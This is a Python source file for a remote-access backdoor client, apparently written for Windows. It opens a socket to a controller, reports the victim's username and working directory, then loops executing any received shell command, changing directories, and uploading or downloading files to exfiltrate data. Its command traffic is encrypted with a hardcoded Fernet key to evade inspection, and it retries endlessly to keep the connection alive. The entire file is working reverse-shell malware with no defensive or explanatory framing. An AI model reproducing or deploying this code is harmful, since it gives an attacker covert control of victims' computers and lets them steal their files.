from socket import socket, error
from os import getcwd, chdir, environ
from subprocess import Popen, PIPE
from time import sleep
from cryptography.fernet import Fernet
key = "jwtU6dABBShoW0T6PGQP7d5mZDZjEUezwrDRmgjXr-g="
cipher_suite = Fernet(key)


def encrypt_response(response):
    return cipher_suite.encrypt(response)


def connection():
    username = environ.get('USERNAME')
    s = socket()
    host = "127.0.0.1"
    port = 9090
    s.connect((host, port))
    details = ("Connected to " + username + "'s computer\n" + getcwd())
    details = encrypt_response(details)
    s.send(details)
    print("Connected ...")
    while True:
        cmd = (s.recv(20000000))
        cmd = cipher_suite.decrypt(cmd)
        if cmd[:3] == "cd " and not cmd == "cd":
            try:
                print("Changing Directory to " + cmd)
                chdir(cmd[3:])
                response = ""
            except WindowsError:
                response = "Directory Not Found"
            response = encrypt_response(response + "\n" + getcwd())
            s.send(response)
        elif cmd[:6] == "upload":
            data = cmd[6:].split("||=shail=||")
            try:
                with open(data[0], "wb") as f:
                    f.write(data[1])
                response = ("File Has Been Uploaded\n")
            except IOError:
                response = "Directory Not Found ..."
            response = encrypt_response(response + "\n" + getcwd())
            s.send(response)
        elif cmd[:8] == "download":
            file = cmd[8:]
            try:
                with open(file, "rb") as f:
                    response = f.read()
            except IOError:
                response = "not found"
            response = encrypt_response(response + "||=shail=||" + getcwd())
            s.send(response)
        else:
            response = Popen(cmd, shell=True, stdin=PIPE, stdout=PIPE, stderr=PIPE)
            response = response.stdout.read() + response.stderr.read()
            response = encrypt_response(response + "\n" + getcwd())
            s.send(response)


x = 0
while True:
    try:
        connection()
    except error:
        x += 1
        print("Retrying ... ({})".format(x))
        sleep(.5)
